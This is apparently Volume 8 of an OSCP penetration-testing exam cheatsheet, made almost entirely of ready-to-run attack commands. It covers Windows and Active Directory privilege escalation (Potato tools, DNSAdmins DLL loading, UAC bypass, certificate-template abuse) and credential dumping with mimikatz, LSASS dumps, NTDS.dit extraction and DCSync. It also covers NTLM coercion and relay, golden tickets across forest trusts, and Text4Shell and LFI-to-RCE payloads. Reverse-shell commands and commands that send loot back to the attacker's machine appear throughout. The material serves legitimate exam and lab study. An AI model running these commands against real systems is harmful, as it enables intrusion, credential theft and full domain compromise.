> Run these in a spare tab **while you manually attack** 80/443/445 — they organize the busy-work; they don't find the path for you. Never wait on them, never rely on them blindly.

---

# [ADDENDUM-PARITY]  extra tools from popular public cheatsheets (parity pass)
> Cross-checked against widely-used community notes (e.g. saisathvik1's). These fill the last gaps. Most are **alternatives** to tools you already have — know they exist; you don't need all of them.

## [PARITY-ENUM]  alternative enumerators
```
dirsearch -u http://$T -e php,txt,html        # web dir brute (alt to feroxbuster/ffuf/gobuster)
dnsenum $DOMAIN                                # DNS enum (alt to dnsrecon); dnsenum --dnsserver $DC $DOMAIN
impacket-services $DOMAIN/U:P@$T list          # enumerate/Start/Stop Windows services remotely
joomscan --url http://$T                       # Joomla (alt to droopescan joomla)
# NOTE: passive-OSINT tools (whois, Shodan, Netcraft, Google-dorking, gitleaks) are for
# real-world/course recon — NOT used on OSCP exam targets (you're given IPs). Skip them for the exam.
```

## [PARITY-WIN-ENUM]  alternative Windows privesc enumerators (pick one if winPEAS is blocked)
```
powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"   # PrivescCheck.ps1
.\jaws-enum.ps1 -OutputFilename jaws.txt                                 # JAWS
# plus already-covered: winPEAS, PowerUp (Invoke-AllChecks), Seatbelt, accesschk
icacls "C:\path\to\file_or_dir"        # check NTFS permissions (who can write) — key for service/binary hijack
icacls "C:\Program Files\svc\bin.exe"  # (F)=full,(M)=modify,(W)=write → writable by you = privesc
tasklist /v                            # running processes + owners (find privileged procs)
tasklist /svc                          # map processes → services
Test-NetConnection -ComputerName $T -Port 445    # test a port from a Windows host (pivot recon, no nmap)
PsLoggedon.exe \\$T                    # who is logged on where (pick lateral-movement targets)
```

## [PARITY-LIN-ENUM]  alternative Linux privesc enumerators (if linpeas unavailable)
```
./LinEnum.sh -t                 # thorough
./linuxprivchecker.py           # classic
./unix-privesc-check standard   # older but useful
# already covered: linpeas.sh, pspy, manual [LINUX-PRIVESC-MANUAL]
```

## [PARITY-POTATO]  SeImpersonate → SYSTEM, full variant list (try in this order)
```
PrintSpoofer64.exe -i -c cmd        # modern default, works 2016–2022
GodPotato-NET4.exe -cmd "cmd /c whoami"
JuicyPotatoNG.exe -t * -p cmd.exe   # when the above fail
RoguePotato.exe -r $IP -e "cmd.exe" -l 9999
SharpEfsPotato.exe -p C:\Windows\System32\cmd.exe -a "/c whoami"   # EFSRPC variant
# concept: all abuse SeImpersonate/SeAssignPrimaryToken to steal SYSTEM token. If one fails, try the next.
```

## [PARITY-AD-RUBEUS]  Rubeus (Windows-side Kerberos — alt to impacket when you have a Windows shell)
```
Rubeus.exe kerberoast /outfile:tgs.txt              # Kerberoast → crack -m 13100
Rubeus.exe asreproast /format:hashcat /outfile:ar.txt   # AS-REP roast → -m 18200
Rubeus.exe dump                                     # dump tickets in memory
Rubeus.exe asktgt /user:U /rc4:<ntlm> /ptt          # overpass-the-hash (hash → TGT → inject)
Rubeus.exe s4u /user:svc /rc4:<hash> /impersonateuser:administrator /msdsspn:cifs/host /ptt  # constrained deleg
# ticket use (Pass-the-Ticket): Rubeus.exe ptt /ticket:<b64-or-kirbi>
```

## [PARITY-NTDS]  extract NTDS.dit on a DC (SeBackup / local admin on DC) → all domain hashes
```
# method 1 - VSS snapshot (vssadmin/diskshadow), then copy NTDS.dit + SYSTEM:
vssadmin create shadow /for=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopyN\Windows\NTDS\NTDS.dit C:\Temp\
reg save HKLM\SYSTEM C:\Temp\SYSTEM
# method 2 - diskshadow script (SeBackup):  diskshadow /s script.txt   (expose+copy)
# method 3 - impacket over the network (needs DCSync rights):
impacket-secretsdump -just-dc $DOMAIN/U:P@$DC
# then offline:
impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL
```

## [PARITY-PTH-EXTRA]  pass-the-hash tool variants
```
pth-winexe -U 'DOMAIN/user%LMHASH:NTHASH' //$T cmd.exe    # classic PtH shell
# already covered: nxc -H, evil-winrm -H, impacket-psexec/wmiexec -hashes :NT
```

## [PARITY-AD-REPORT]  AD reporting (optional, deeper analysis)
```
# PlumHound / PingCastle = generate AD posture reports from BloodHound/AD data.
# Nice-to-have for study; on the exam BloodHound (Vol 5 [AD-BLOODHOUND]) is enough.
```

---

# [ADDENDUM-PARITY-2]  broader sweep (0xsyr0/OSCP + AD cheatsheets)
> Cross-checked against more large community repos. Added the **exam-relevant** items only. Skipped OSEP/CRTP-level tradecraft (Skeleton Key, custom SSP/mimilib, SID-History, Forest-Trust tickets, PrivExchange, DSRM) — *not* on OSCP; don't study them for this exam.

## [AD-ADCS]  Active Directory Certificate Services abuse (Certipy) — increasingly OSCP-relevant
**WHAT:** misconfigured certificate templates let a normal user enroll a cert **as** a privileged user → get their NT hash/TGT. Attack IDs **ESC1–ESC8**.
```
certipy find -u U@$DOMAIN -p P -dc-ip $DC -vulnerable -stdout    # find vulnerable templates
# ESC1 (template allows requester-supplied SAN): request a cert as admin
certipy req -u U@$DOMAIN -p P -ca <CA-NAME> -template <TMPL> -upn administrator@$DOMAIN
certipy auth -pfx administrator.pfx -dc-ip $DC                    # → NT hash + TGT for admin
# ESC8 (web enrollment + relay): coerce a DC → ntlmrelayx to http://CA/certsrv → DC cert → DCSync
```
Tools: **Certipy** (Linux), **Certify.exe** + **Rubeus** (Windows), **PassTheCert**. Cross-ref `[CVE-HITS]` ADCS.

## [PARITY2-CRED-DUMP]  credential dumping — the full toolbox
```
# mimikatz (Windows, admin):
  privilege::debug
  sekurlsa::logonpasswords          # plaintext/NTLM from LSASS
  sekurlsa::ekeys                    # Kerberos keys
  sekurlsa::tickets /export          # export TGT/TGS
  lsadump::sam                       # local SAM hashes
  lsadump::secrets                   # LSA secrets (service creds)
  lsadump::dcsync /user:$DOMAIN\krbtgt   # DCSync a user
# no mimikatz on the box? dump LSASS then parse offline:
  # dump:  procdump -ma lsass.exe lsass.dmp   OR  rundll32 comsvcs.dll,MiniDump <pid> lsass.dmp full
  pypykatz lsa minidump lsass.dmp    # parse the dump on Kali
# remote (from Kali, with admin creds):
  lsassy -u U -p P -d $DOMAIN <hosts>      # remote LSASS dump+parse
  nxc smb <hosts> -u U -p P --lsa --sam    # LSA + SAM via netexec
# app/browser creds on a Windows box:
  LaZagne.exe all                    # dumps browsers, wifi, apps, etc.
```

## [PARITY2-COERCE]  auth coercion + relay (for delegation/ADCS paths)
```
petitpotam.py -u U -p P <listener-ip> $DC        # coerce DC to auth to you
printerbug.py $DOMAIN/U:P@$DC <listener-ip>       # MS-RPRN "printer bug"
coercer coerce -u U -p P -t $DC -l <listener-ip>  # multi-method coercion
# relay the coerced auth:
impacket-ntlmrelayx -t ldaps://$DC --delegate-access      # RBCD, or
impacket-ntlmrelayx -t http://<CA>/certsrv/certfnsh.asp --adcs  # ESC8 → DC cert
mitm6 -d $DOMAIN                                   # IPv6 DNS takeover (pair with ntlmrelayx -6)
```

## [PARITY2-DNSADMINS]  DNSAdmins group → SYSTEM on the DC
```
# if your user is in DNSAdmins, load a malicious DLL as the DNS service (SYSTEM):
dnscmd $DC /config /serverlevelplugindll \\$IP\share\evil.dll
sc \\$DC stop dns & sc \\$DC start dns            # DLL executes as SYSTEM on the DC
# build DLL:  msfvenom -p windows/x64/exec CMD='...' -f dll  (or a custom add-user DLL)
```
Related: **Backup Operators** membership → back up SAM/SYSTEM/NTDS (`diskshadow`/`reg save`) → dump hashes (see `[PARITY-NTDS]`).

## [PARITY2-MSSQL]  MSSQL deeper (PowerUpSQL + linked servers)
```
# PowerUpSQL (Windows):
Get-SQLInstanceDomain ; Get-SQLServerInfo -Instance <srv>
Get-SQLServerLinkCrawl -Instance <srv> -Query 'exec master..xp_cmdshell ''whoami'''
# manual linked-server RCE (execute on a trusted linked box):
EXEC ('sp_configure ''xp_cmdshell'',1;reconfigure;exec xp_cmdshell ''whoami''') AT [LINKEDSRV]
# from Kali:  impacket-mssqlclient $DOMAIN/U:P@$T -windows-auth   → enable_xp_cmdshell; xp_cmdshell whoami
```

## [PARITY2-SHELLS-PIVOT]  Windows-side transfer/pivot extras
```
# Powercat (PowerShell netcat): reverse shell / file transfer
powercat -c $IP -p 443 -e cmd.exe            # reverse   | -l -p 443 -e cmd.exe = bind
# RunasCs (run as another user from a non-interactive shell — huge when you have creds but no RDP/WinRM):
RunasCs.exe <user> <pass> "cmd /c whoami" -r $IP:443      # -r = reverse connect
# FullPowers (restore stripped privileges for a service account → regain SeImpersonate):
FullPowers.exe
# Windows port forwarding without chisel:
netsh interface portproxy add v4tov4 listenport=8080 connectaddress=<internal-ip> connectport=80
plink.exe -R 3389:127.0.0.1:3389 $USER@$IP    # SSH remote-forward from Windows (plink)
socat TCP-LISTEN:8080,fork TCP:<internal>:80  # simple relay (Linux pivot)
```

## [PARITY2-WEB-EXTRA]
```
phpggc Monolog/RCE1 system 'id' -b            # generate PHP deserialization payload (gadget chains)
python3 jwt_tool.py <JWT> -T                    # interactively tamper/forge a JWT (alg confusion, etc.)
python3 ntlm_theft.py -g all -s $IP -f doc      # generate malicious files (.lnk/.scf/.xml…) to capture NetNTLM
gittools / git-dumper                           # dump exposed .git → source + secrets
```

## [PARITY2-WORDLIST-BRUTE]
```
cewl -d 2 -m 5 -w words.txt http://$T          # scrape the site into a custom wordlist
crunch 6 8 -t @@@@%%% -o w.txt                  # generate patterned candidates
medusa -h $T -u U -P rockyou.txt -M ssh         # brute alt to hydra
# kernel-exploit suggesters:
#   Windows: wesng / windows-exploit-suggester / Watson / Sherlock (from `systeminfo`)
#   Linux:   linux-exploit-suggester (LES) / linux-exploit-suggester2 (from `uname -a`)
```

## [PARITY2-ENUM-EXTRA]
```
masscan -p1-65535 $T --rate 1000 -oL masscan.txt   # very fast port sweep (ALWAYS re-verify with nmap -sCV)
nmblookup -A $T                                     # NetBIOS names (alt SMB recon)
# AD enum alternatives to PowerView: SharpView.exe, AdFind.exe, ADExplorer, adidnsdump, ldapdomaindump
```

---

# [GAP-FILL-FINAL]  self-audit gap fills (things every OSCP toolkit should have)

## [AD-DOUBLEHOP]  the "double hop" problem (bites everyone in AD)
```
SYMPTOM: your evil-winrm / WinRM / PSRemoting shell works, but FROM it you can't reach a THIRD
         host or a network share (Access Denied / "no creds") — your creds don't forward past hop 1.
WHY: NTLM/WinRM doesn't delegate your credential to the next hop.
FIXES (pick one):
 - Work from YOUR Kali through a pivot instead, passing creds directly ([PIVOT-QUICK] + nxc/impacket -u/-p or -H)
 - Kerberos ticket: getTGT.py $DOMAIN/U:P → export KRB5CCNAME=U.ccache → tools with -k -no-pass
 - Pass creds explicitly each command:
     $p=ConvertTo-SecureString 'PASS' -AsPlainText -Force
     $c=New-Object System.Management.Automation.PSCredential('DOMAIN\U',$p)
     Invoke-Command -ComputerName host2 -Credential $c -ScriptBlock { whoami }
 - Get a full interactive session on the box (RDP / RunasCs) so creds are present, then act locally
```

## [AD-LAPS-GMSA]  read managed passwords (when you have the rights)
```
# LAPS (randomized local-admin password stored in AD; some users/groups can read it):
netexec ldap $DC -u U -p P -M laps                 # dump LAPS passwords you can read
netexec smb  $T  -u U -p P --laps                   # or authenticate using LAPS pw
ldapsearch -x -H ldap://$DC -D 'U@$DOMAIN' -w P -b "dc=..,dc=.." "(ms-Mcs-AdmPwd=*)" ms-Mcs-AdmPwd
# gMSA (group Managed Service Account; readable by authorized principals):
python3 gMSADumper.py -u U -p P -d $DOMAIN           # → gMSA NT hash → PtH
netexec ldap $DC -u U -p P --gmsa
```

## [WIN-UAC-BYPASS]  medium-integrity admin → high-integrity (bypass UAC)
```
# You're a LOCAL ADMIN but the shell is medium-integrity (whoami /groups shows no "High Mandatory").
# fodhelper:
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /d "C:\Temp\rev.exe" /f
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /v DelegateExecute /f
start fodhelper.exe                                   # runs your payload high-integrity
# eventvwr variant: HKCU\Software\Classes\mscfile\shell\open\command → payload, run eventvwr.exe
# or use the UACME project. Only needed when you must be elevated (e.g., to dump SAM).
```

## [WIN-PRIV-GROUPS]  privileged groups → SYSTEM/DC (besides Domain/Enterprise Admins)
```
Server Operators  → modify/restart a DC service → sc config <svc> binPath= "..." → SYSTEM on DC
Backup Operators  → back up SAM/SYSTEM/NTDS → dump hashes (SeBackup, [PARITY-NTDS])
DnsAdmins         → load DLL as DNS service → SYSTEM on DC ([PARITY2-DNSADMINS])
Account Operators → create/modify most users & groups (not protected ones)
Print Operators   → SeLoadDriverPrivilege → vulnerable-driver exploit
# check your groups:  whoami /groups   |  net user %username% /domain
```

## [LINUX-LD-LIBRARY]  LD_LIBRARY_PATH / shared-lib hijack via sudo
```
# sudo -l shows env_keep+=LD_LIBRARY_PATH (or LD_PRELOAD): hijack a library the allowed binary loads.
gcc -shared -fPIC -o /tmp/evil.so evil.c            # evil.c defines the function the binary calls (spawns shell)
sudo LD_LIBRARY_PATH=/tmp <allowed-binary>          # or sudo LD_PRELOAD=/tmp/evil.so <allowed-binary>
```

## [WEB-403-BYPASS]  a path returns 403/401 — try to get in
```
paths:   /admin//  /admin/.  /./admin  /admin%20  /admin%09  /admin?  /admin#  /ADMIN  /admin/..;/
headers: X-Forwarded-For: 127.0.0.1 | X-Original-URL: /admin | X-Rewrite-URL: /admin | Referer: same-site
methods: swap GET→POST/HEAD/PUT/TRACE ; try HTTP/1.0
tools:   ffuf with the above; the "bypass-403"/"4-ZERO-3" scripts
```

## [WEB-PUT-WEBDAV]  writable HTTP PUT / WebDAV → upload a shell
```
nmap -p80 --script http-put --script-args http-put.url='/shell.php',http-put.file='./shell.php' $T
curl -X PUT http://$T/shell.php --data-binary @shell.php     # if PUT is allowed → browse it
davtest -url http://$T/webdav                                 # probe WebDAV (what execs?)
cadaver http://$T/webdav                                      # interactive: put shell.php / shell.asp
# WebDAV often has default creds (wampp:xampp) → try, or hydra http-get
```

## [WEB-PARAM-MINING]
```
arjun -u http://$T/page                              # dedicated hidden-parameter discovery
wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u 'http://$T/page?FUZZ=1' --hw 0
# (ffuf param brute already in [WEB-CONTENT])
```

## [ENUM-MISC-PORTS]  less-common services worth a look
```
23   Telnet    → telnet $T 23 ; banner + default/weak creds (often network devices)
79   finger    → finger root@$T ; finger @$T  (user enumeration on old *nix)
110/143 POP3/IMAP → nc $T 110 ; try found creds; read mail (creds/loot)
513/514 rlogin/rsh → rlogin -l root $T (legacy trust relationships)
873  rsync     → rsync $T::            (list modules) ; rsync -av $T::<mod>/ loot/  (pull, often anon)
2049 NFS       → already [ENUM-NFS]
5900 VNC       → vncviewer $T ; nmap --script vnc-info,realvnc-auth-bypass -p5900 $T ; hydra vnc
9200 Elastic   → curl $T:9200/_cat/indices ; CVE-2015-1427 (old) [CVE-HITS]
```

## [SHELL-REVSHELLS]  generator bookmark
```
# https://www.revshells.com — builds any reverse shell (bash/python/php/powershell/nc/…) with your
# IP+port pre-filled, incl. URL-encoded + msfvenom variants. Keep an OFFLINE copy for exam day.
# (Core one-liners are already in [SHELL-QUICK]; this is the "under pressure, just copy it" fallback.)
```

---

# [ADDENDUM-PARITY-3]  deep-mine additions (0xsyr0/OSCP sweep)
> Systematic extraction from the deepest single-file community cheatsheet. These are the genuine gaps it had that this KB didn't.

## [PARITY3-INSTALL]  install/setup commands that were missing
```
sudo apt install -y krb5-user                 # Kerberos client (kinit, klist) for ccache/AD ticket workflow
sudo apt install -y mingw-w64 gcc-multilib    # cross-compile Win exe + build 32-bit Linux (also in [KALI-SETUP])
git clone https://github.com/ropnop/impacket_static_binaries   # precompiled impacket to DROP ON a target (no python needed)
# run a python exploit that has dependencies, cleanly:
python3 -m venv venv && source venv/bin/activate && pip install -r requirements.txt
```

## [PARITY3-SUDOEDIT]  CVE-2023-22809 — sudoedit arbitrary file write → root
```
# If `sudo -l` allows sudoedit (or a *edit rule) and sudo is 1.8.0–1.9.12p1:
# the EDITOR var accepts an extra file via "--", letting you edit ANY root-owned file.
EDITOR="vim -- /etc/passwd"  sudoedit /path/to/allowed/file   # then add a root user line → su
# (companions already in [LINUX-SUDO]: CVE-2019-14287 `sudo -u#-1`, CVE-2021-3156 Baron Samedit)
```

## [PARITY3-LFI-FILTERCHAIN]  LFI → RCE with NO writable log (php filter chain)
```
# when you have a pure LFI (?page=) but no log/upload to poison — generate a filter-chain payload:
python3 php_filter_chain_generator.py --chain '<?php system($_GET["c"]); ?>'
# paste the produced php://filter... string into the LFI param, then add &c=id   ([WEB-LFI])
```

## [PARITY3-FFUF]  ffuf flags worth knowing
```
ffuf -w list.txt -u http://$T/FUZZ -ac              # -ac = AUTO-calibrate (auto-filters junk responses)
ffuf -w list.txt -u http://$T/FUZZ -mc all -fs 0    # -mc all match every code, then filter by size
ffuf -w list.txt -u http://$T/FUZZ -e .php,.txt,.bak -recursion
ffuf -w users.txt -u http://$T/admin/FUZZ.php -b "PHPSESSID=xxx" -fw 2644   # authenticated fuzz + filter words
```

## [PARITY3-KERBEROS]  ticket workflow (mostly in `[KERBEROS-QUICK]`, completing it)
```
impacket-getTGT $DOMAIN/$U:'PASS'                    # → $U.ccache
export KRB5CCNAME=$(realpath $U.ccache)              # tell tools to use it
klist                                               # show tickets you hold
impacket-ticketConverter $U.kirbi $U.ccache          # .kirbi (Windows/Rubeus) → .ccache (Linux)
impacket-mssqlclient -k $T.$DOMAIN                   # -k = use the Kerberos ticket (no password)
```

## [PARITY3-MISC]  small but useful
```
snmpwalk -v2c -c public $T nsExtendObjects           # scripts snmpd runs (often as root → privesc lead)
hashcat -a 3 -m 0 hash.txt ?u?l?l?l?d?d?d?d           # mask attack (bruteforce a pattern)
hashcat -a 6 -m 0 hash.txt wordlist.txt ?d?d?d       # hybrid: wordlist + appended mask
# DirtyCOW (old kernels) compile:  gcc -pthread dirty.c -o dirty -lcrypt ; ./dirty <newpass>
# Shocker (CGI shellshock container/host file read):  ./shocker <path-to-read>
# start services on Kali to receive:  sudo systemctl start ssh   (then scp target→you)
```

> **Honesty note on "everything":** this KB carries the **commands you actually type** (the 80/20) and links the long tail (`[RESOURCES]`). Multi-file Obsidian repos (fatalxs, LeonardoE95's module notes) can't be fully mined from a README, and *no* finite notes file holds every flag of every tool — that's what GTFOBins/HackTricks/`--help` are for. The systematic sweeps are done; remaining micro-gaps are best found by **using this on real boxes**.

---

# [ADDENDUM-PARITY-4]  more from a PEN-200-aligned cheatsheet (final parity)

## [PARITY4-TRANSFER]  upload server (target → your Kali)
```
pip3 install uploadserver                             # one time
python3 -m uploadserver 8000                          # Kali: accepts uploads at /upload
# from target:  curl.exe http://<KaliIP>:8000/upload -F files=@C:\loot\file.zip   (Linux: curl -F ...)
```

## [PARITY4-SIGMAPOTATO]  SigmaPotato (newest Potato — try when GodPotato/PrintSpoofer fail)
```
.\SigmaPotato.exe "net localgroup Administrators <you> /add"    # SeImpersonate → run as SYSTEM
.\SigmaPotato.exe --revshell <KaliIP> 4444                      # direct reverse shell
```
Order to try SeImpersonate→SYSTEM: PrintSpoofer → GodPotato → **SigmaPotato** → JuicyPotatoNG/RoguePotato (`[WINDOWS-TOKENS]`).

## [PARITY4-LIGOLO]  Ligolo-ng current syntax (newer than `ip tuntap`)
```
sudo ligolo-proxy -selfcert                            # on Kali
./agent -connect <KaliIP>:11601 -ignore-cert           # on the pivot host
# in the ligolo console:
interface_create --name ligolo
start --tun ligolo
route_add --name ligolo --route 172.16.247.0/24        # then run tools natively at 172.16.247.x
```

## [PARITY4-WINLOOT]  Windows cred/hive dump extras
```
reg save hklm\sam sam & reg save hklm\system system & reg save hklm\security security   # +security hive (LSA/cached)
impacket-secretsdump -sam sam -system system -security security LOCAL                    # parse offline
Get-WinEvent -MaxEvents 30 | findstr backup            # event logs sometimes leak creds/hints
```

## [PARITY4-ENABLE-RDP]  turn on RDP after you're admin (for a GUI / stable access)
```
reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
net localgroup "Remote Desktop Users" <you> /add
```

## [PARITY4-AD-EXTRA]  PowerView + trust enumeration extras
```
setspn -L <svcaccount>                                 # SPNs of an account (kerberoast targets)
Get-NetUser -SPN | select samaccountname,serviceprincipalname
Get-NetSession -ComputerName files04                   # who's logged on where (lateral targeting)
Get-ObjectAcl -Identity <user> | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier
Convert-SidToName S-1-5-21-...-1104                     # SID → name
Find-DomainShare ; Find-LocalAdminAccess               # shares / where you're local admin
nltest /domain_trusts /v                               # enumerate domain trusts
```

## [PARITY4-CREDSNIFF]  Linux: catch creds/cron in real time (on a shell)
```
watch -n 1 "ps -aux | grep -i pass"                    # spot a process passing a password on its cmdline
sudo tcpdump -i lo -A | grep -i pass                   # sniff loopback (local service auth)
grep CRON /var/log/syslog                              # see what cron runs (privesc lead)
```

## [PARITY4-MISC]
```
snmpbulkwalk -v2c -c public $IP                         # faster than snmpwalk; sudo apt install snmp-mibs-downloader for readable OIDs
# Golden Ticket across a trust (child→parent): impacket-ticketer ... -extra-sid <parent-Enterprise-Admins-SID> Administrator
```

---

# [ADDENDUM-PARITY-5]  8-challenge-lab sweep (Secura, Medtech, OSCP-A/B/C, Zeus, Poseidon, Laser)
> Went through all 8 OSCP challenge-lab walkthroughs. **~95% was already covered** — these are the genuine additions. The labs also use many **app-specific RCEs** (Aerospike CVE-2020-13151, Mobile Mouse, Usermin 1.820, Vesta CP, FreeSWITCH mod_event_socket, unisql) — all handled by the generic flow: **identify version → `searchsploit` → run the PoC** (`[EXPLOIT-RESEARCH]`). Don't memorize them.

## [WEB-TEXT4SHELL]  CVE-2022-42889 (Text4Shell — Apache Commons Text 1.5–1.9)
Log4Shell's cousin: string interpolation → RCE. Drop into any reflected input / search field:
```
${script:javascript:java.lang.Runtime.getRuntime().exec('id')}
${url:UTF-8:http://<yourIP>/x}   ${dns:address|<yourIP>}     # confirm with an OOB callback first
```
Public PoC exists; pair with `[WEB-CMDINJ]`.

## [ENUM-JDWP]  Java Debug Wire Protocol (exposed debug port — often 8000/8787/high)
An open **JDWP** port = RCE (attach a debugger, execute code). Detect: `nmap -sV` shows *"Java Debug Wire Protocol"*. Exploit: `jdwp-shellifier.py` (or EDB 46501) → command exec → reverse shell.

## [WINDOWS-CREDS-PUTTY]  stored session creds (winPEAS finds these)
```
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s     # PuTTY proxy password often PLAINTEXT
# also: WinSCP (registry/.ini), FileZilla recentservers.xml / sitemanager.xml → saved FTP/SFTP creds
```

## [SMB-SLINKY]  nxc slinky — auto-drop a malicious .lnk in a writable share → capture NTLM
```
nxc smb $IP -u u -p p -M slinky -o NAME=important SERVER=<yourIP>   # drops a .lnk into writable shares
# then run `responder -A` / `ntlmrelayx` to catch the NetNTLMv2 when a user browses the folder
```
Automates the `.scf`/`.url`/`.lnk` drop from `[SMB-ATTACK]`. ⚠️ Exam: capturing via a file the user opens is fine; Responder **poisoning** is not (`[EXAM-RULES-2026]`).

## [PCAP-ANALYSIS]  you found a .pcap/.pcapng → mine it for creds
```
wireshark file.pcapng        # GUI: right-click → Follow TCP/HTTP Stream; File → Export Objects → HTTP
tshark -r file.pcap -Y 'http.authorization || ftp || telnet' -T fields -e text   # CLI quick pull
```
Look for: HTTP basic-auth, FTP/telnet plaintext, form logins, SMB/NTLM hashes (→ crack). Also `strings file.pcap | grep -i pass`.

## [AD-TRUST]  child → parent forest-trust escalation (Poseidon-style)
If you own a **child** domain (have its `krbtgt` hash) you can forge into the **parent/forest root** via SID history:
```
nltest /domain_trusts /v                                              # map trusts + get domain SIDs
impacket-secretsdump -just-dc-user krbtgt <child>/<u>:<p>@<childDC>    # child krbtgt hash
impacket-ticketer -nthash <krbtgt> -domain <child> -domain-sid <child-SID> \
    -extra-sid <parent-SID>-519 Administrator                         # golden ticket + Enterprise Admins SID
export KRB5CCNAME=Administrator.ccache
impacket-psexec <child>/Administrator@<parentDC> -k -no-pass          # own the forest root
```
The `-extra-sid ...-519` injects the **parent's Enterprise Admins** into your ticket = forest compromise.

---

# [BOF-DEPRECATED]  Buffer Overflow — ⚠️ NOT on the current OSCP+ exam
**The classic 25-pt Windows stack-BOF box was removed.** Know the *concept* for general knowledge; **do NOT spend prep time here.** Compact reference only:
```
1 Fuzz until crash → 2 msf-pattern_create -l N → send → find EIP → msf-pattern_offset -q <val>
3 Control EIP (offset) → 4 find bad chars (send \x00..\xff, compare in debugger, remove dupes)
5 !mona jmp -r esp -cpb '<badchars>' → pick a JMP ESP address (little-endian)
6 msfvenom -p windows/shell_reverse_tcp LHOST LPORT -b '<badchars>' -f c
7 buffer = "A"*offset + JMP_ESP + "\x90"*16 (NOP sled) + shellcode → nc -lvnp → win
```
If a modern exam box ever needs a memory bug, it'll come with source or a clear public PoC — treat it as `[EXPLOIT-RESEARCH]` + `[FIXING-EXPLOITS]`, not hand-crafted stack smashing.

---
*End Volume 8. This is your exam-day command center — combine with `[EXAM-DAY-FLOW]` (Vol 7) and `[FINAL-DAY-QUICK-REFERENCE]` (Vol 6).*
